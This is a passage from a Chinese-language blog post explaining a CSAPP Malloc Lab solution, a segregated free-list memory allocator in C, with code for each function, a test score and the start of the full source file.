GET(GET_SUCC(bp)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;	<span class="comment">// 前驱为空，后继也为空</span></span><br><span class="line">    	PUT(heap_listp + index * WSIZE, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// PUT(GET_PRED(bp), NULL);	// 并不需要</span></span><br><span class="line">    <span class="comment">// PUT(GET_SUCC(bp), NULL);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><ul>
<li><p>通过 size（块大小）找到合适大小类的下标</p>
</li>
<li><p><code>CLASS_NUM - 1 + 4</code></p>
<ul>
<li>+4 是因为 i 从 4 开始</li>
<li>-1 是因为大小类有 CLASS_NUM 个，假设 i 从 0 开始，那么大小类的范围为：[0, 2^0^]、(2^0^, 2^1^] …… [2^CLASS_NUM-2^, +endless]，这就导致了我们最后一次需要和 2^CLASS_NUM-2^ 比较，一共比较 CLASS_NUM - 2 次。如果都不成功，返回最后一个大小类的下标 CLASS_NUM - 1</li>
</ul>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tatic <span class="type">size_t</span> <span class="title function_">search</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">4</span>; i &lt; CLASS_NUM - <span class="number">1</span> + <span class="number">4</span>; ++i) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (size &lt;= (<span class="number">1</span> &lt;&lt; i)) &#123;</span><br><span class="line">    	    <span class="keyword">return</span> i - <span class="number">4</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i - <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="mm-malloc-1"><a href="#mm-malloc-1" class="headerlink" title="mm_malloc"></a>mm_malloc</h2><ul>
<li><p>和隐式空闲链表的 mm_malloc 操作完全一样。在空闲链表中找有没有合适的空闲块，如果没有就向系统请求创建新的空闲块</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendSize;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) </span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE) &#123;	<span class="comment">// 强制最小块大小为 16 字节</span></span><br><span class="line">    	asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	asize = DSIZE * ((size + DSIZE + (DSIZE - <span class="number">1</span>)) / DSIZE);	<span class="comment">// 向上取整为到最接近 8 的倍数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;	<span class="comment">// 在空闲链表中找有没有合适的空闲块</span></span><br><span class="line">    	place(bp, asize);</span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    extendSize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendSize / WSIZE)) == <span class="literal">NULL</span>)	<span class="comment">// 创建新的空闲块</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="find-fit-1"><a href="#find-fit-1" class="headerlink" title="find_fit"></a>find_fit</h2><ul>
<li><p>在空闲链表中找有没有合适的空闲块，还是 <strong>首次适配</strong> 的策略，只不过效率提升到了和空闲块的数量呈线性关系的时间</p>
</li>
<li><p>通过 asize（块大小）定位到合适的大小类，从这个大小类维护的空闲链表开始找，如果这个大小类没有合适的空闲块，继续从更大的大小类维护的空闲链表中找</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> index = search(asize);</span><br><span class="line">    <span class="type">void</span> * bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (index &lt; CLASS_NUM) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (GET_HEAD(index) == <span class="literal">NULL</span>) &#123;	<span class="comment">// 这个大小类为空</span></span><br><span class="line">    	    index++;</span><br><span class="line">    	    <span class="keyword">continue</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">for</span> (bp = GET_HEAD(index); bp != <span class="literal">NULL</span>; bp = (<span class="type">void</span> *)GET(GET_SUCC(bp))) &#123; <span class="comment">// 遍历这个大小类的空闲链表</span></span><br><span class="line">    	    <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp))) &#123;</span><br><span class="line">    	    	<span class="keyword">return</span> bp;</span><br><span class="line">    	    &#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="place-1"><a href="#place-1" class="headerlink" title="place"></a>place</h2><ul>
<li><p>和隐式空闲链表的 place 操作一样。只不过每次 place 时需要将这个空闲块从相应的大小类中删除</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= <span class="number">2</span> * DSIZE) &#123;	<span class="comment">// 如果块的剩余部分大于一个最小块的大小，那么就分割</span></span><br><span class="line">    	delete(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));	<span class="comment">// 初始化已分配块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">    	bp = NEXT_BLKP(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));	<span class="comment">// 初始化分割后的空闲块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">    	PUT(GET_PRED(bp), <span class="literal">NULL</span>);</span><br><span class="line">    	PUT(GET_SUCC(bp), <span class="literal">NULL</span>);</span><br><span class="line">    	insert(bp);</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	delete(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="mm-free-1"><a href="#mm-free-1" class="headerlink" title="mm_free"></a>mm_free</h2><ul>
<li><p>和隐式空闲链表的 mm_free 操作一样。在 coalesce 方法的最后会将这个释放后的空闲块 insert 到合适的大小类</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    	</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    coalesce(bp);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="mm-realloc-1"><a href="#mm-realloc-1" class="headerlink" title="mm_realloc"></a>mm_realloc</h2><ul>
<li><p>和隐式空闲链表的 mm_realloc 操作一样，就不再赘述了</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="type">void</span> *newptr;</span><br><span class="line">    <span class="type">size_t</span> copySize;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((newptr = mm_malloc(size)) == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = GET_SIZE(HDRP(oldptr));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)	<span class="comment">// 保证 copySize 始终是最小的</span></span><br><span class="line">      copySize = size;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);	<span class="comment">// 将 oldptr 指向的旧块中 copySize 个字节的值拷贝到 newptr 指向的新块</span></span><br><span class="line">    mm_free(oldptr);	<span class="comment">// 释放 oldptr 指向的旧块</span></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Test-1"><a href="#Test-1" class="headerlink" title="Test"></a>Test</h2><ul>
<li>通过 <strong>make</strong> 重新编译文件，**.&#x2F;mdriver -t .&#x2F;traces -V** 进行测试。结果如下</li>
</ul>
<img src="/2024/04/07/CSAPP-Lab7/image-20240409185529344.png" class="" title="image-20240409185529344">

<blockquote>
<p>84 分！终于得到了一个还能看的分数，hhh</p>
</blockquote>
<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
<li>整理过后，完整的代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* mm-naive.c - The fastest, least memory-efficient malloc package.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * In this naive approach, a block is allocated by simply incrementing</span></span><br><span class="line"><span class="comment"> * the brk pointer.  A block is pure payload. There are no headers or</span></span><br><span class="line"><span class="comment"> * footers.  Blocks are never coalesced or reused. Realloc is</span></span><br><span class="line"><span class="comment"> * implemented directly using mm_malloc and mm_free.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE TO STUDENTS: Replace this header comment with your own header</span></span><br><span class="line"><span class="comment"> * comment that gives a high level description of your solution.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;memlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> * NOTE TO STUDENTS: Before you do anything else, please</span></span><br><span class="line"><span class="comment"> * provide your team information in the following struct.</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line"><span class="type">team_t</span> team = &#123;</span><br><span class="line">    <span class="comment">/* Team name */</span></span><br><span class="line">    <span class="string">&quot;ateam&quot;</span>,</span><br><span class="line">    <span class="comment">/* First member&#x27;s full name */</span></span><br><span class="line">    <span class="string">&quot;YiweiBoi&quot;</span>,</span><br><span class="line">    <span class="comment">/* First member&#x27;s email address */</span></span><br><span class="line">    <span class="string">&quot;2132858746@qq.com&quot;</span>,</span><br><span class="line">    <span class="comment">/* Second member&#x27;s full name (leave blank if none) */</span></span><br><span class="line">    <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="comment">/* Second member&#x27;s email address (leave blank if none) */</span></span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4				<span class="comment">// 单字，头部/脚部大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8				<span class="comment">// 双字大小	</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;12)	<span class="comment">// 空闲块的默认大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc) ((size) | (alloc))	<span class="comment">// 打包头部/脚部中 size（大小）和 alloc（有效位）到一个字中</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// p 指针是一个 void* 指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p) (*(unsigned int *)(p))					<span class="comment">// 读 p 指针指向的值</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) ((*(unsigned int *)(p)) = (val))	<span class="comment">// 将 val 写入 p 指针所指向的位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// p 指向一个块的头部/脚部</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)	<span class="comment">// 读取头部/脚部中 size，即读取一个块的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)	<span class="comment">// 读取头部/脚部中 alloc，即读取一个块的有效位（001 表示有效，000 表示无效）</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bp 指向这个块载荷部分的起始位置</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)							<span class="comment">// 得到 bp 这个块的头部指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)	<span class="comment">// 得到 bp 这个块的脚部指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))	<span class="comment">//得到下一个块载荷位置的指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))	<span class="comment">// 得到上一个块的载荷位置的指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *heap_listp;	<span class="comment">// 指向大小类的起始地址</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">void</span> *bp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">void</span> *bp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">search</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NUM 20	<span class="comment">// 大小类的数量</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PRED(bp) ((char *)(bp))				<span class="comment">// 得到当前块的前驱指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SUCC(bp) (((char *)(bp)) + WSIZE)	<span class="comment">// 得到当前块的后继指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_HEAD(index) ((char *)GET(heap_listp + index * WSIZE))	<span class="comment">// 得到指定大小类头节点载荷部分的指针 </span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk((<span class="number">4</span> + CLASS_NUM) * WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);	<span class="comment">// 初始化填充字</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CLASS_NUM; i++) 	<span class="comment">// 初始化大小类</span></span><br><span class="line">    	PUT(heap_listp + WSIZE + i * WSIZE, <span class="literal">NULL</span>); </span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp + <span class="number">1</span> * WSIZE + CLASS_NUM * WSIZE, PACK(DSIZE, <span class="number">1</span>));	<span class="comment">// 初始化序言块</span></span><br><span class="line">    PUT(heap_listp + <span class="number">2</span> * WSIZE + CLASS_NUM * WSIZE, PACK(DSIZE, <span class="number">1</span>));	</span><br><span class="line">    PUT(heap_listp + <span class="number">3</span> * WSIZE + CLASS_NUM * WSIZE, PACK(<span class="number">0</span>, <span class="number">1</span>));		<span class="comment">// 初始化结尾块</span></span><br><span class="line">    heap_listp += WSIZE;	</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="literal">NULL</span>)	<span class="comment">// 创建初始的空闲块</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span 